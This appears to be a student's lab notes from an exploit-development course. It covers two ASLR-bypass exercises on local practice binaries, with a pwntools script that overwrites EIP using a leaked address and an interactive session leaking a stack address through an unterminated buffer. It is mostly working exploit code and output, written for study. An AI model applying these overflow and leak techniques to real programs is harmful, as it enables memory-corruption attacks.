aslr_leak1:
we have address of a funtion which is chanign everytime it execute
we use pwn tools to overwrite eip
root@kali:~/exploits/lecture/code/aslr# python3 ex1.py
[+] Starting local process './aslr_leak1': pid 67397
[*] û·cV
[+] You found me!
    Good job!
[*] Stopped process './aslr_leak1' (pid 67397)
root@kali:~/exploits/lecture/code/aslr# cat ex1.py 
from pwn import *

p = process('./aslr_leak1')
val = p.recvline()
b = p32(int(val.decode().split()[3],16))
log.info(b.decode('latin-1'))
p.sendline("A"*28 + b.decode('latin-1'))
val2 = p.recv(2000)
log.success(val2.decode())
p.close()


p = process('./aslr_leak1')
val = p.recvline()
b = p32(int(val.decode().split()[3],16))
log.info(str(b)[2:-1])  // in the older python versions
p.sendline("A"*28 + b.decode('latin-1'))
val2 = p.recvline()
log.success(val2.decode())
p.close()

aslr_leak2

./aslr_leak2 `python -c ‘print “A”*16’`  \\16 A's are stored in char buff of size 16 use memcpy(buff, input, 16)
as the buff is full without any null termination the next printf which takes the buff as input prints till the null byte in stack which leaks the address.

>>> p = process(['./aslr_leak2',"A"*16])
[x] Starting local process './aslr_leak2'
[+] Starting local process './aslr_leak2': pid 4440
>>> val = p.recv(2000)
>>> val
b'Leaky buffer: AAAAAAAAAAAAAAAA \x18E\n'
>>> val = val.strip()   \\ removing \n
>>> val
b'Leaky buffer: AAAAAAAAAAAAAAAA \x18E'
>>> val += b'\r'     \\\ i am adding this \r as pwntools is only grabbing 3 byte of leaked address..... i dont know why....then i say a working expoit which reads \r in every address that got leaked
>>> val
b'Leaky buffer: AAAAAAAAAAAAAAAA \x18E\r'
>>> val[33]
13
>>> val[32]
69
>>> val[31]
24
>>> val[30]
32
>>> val[30:]
b' \x18E\r'
>>> struct.unpack("<I",val[30:])[0]
222631968
>>> hex(struct.unpack("<I",val[30:])[0])
'0xd451820'
>>> print("0x%08x" % 222631968)
0x0d451820   \\ leaked address


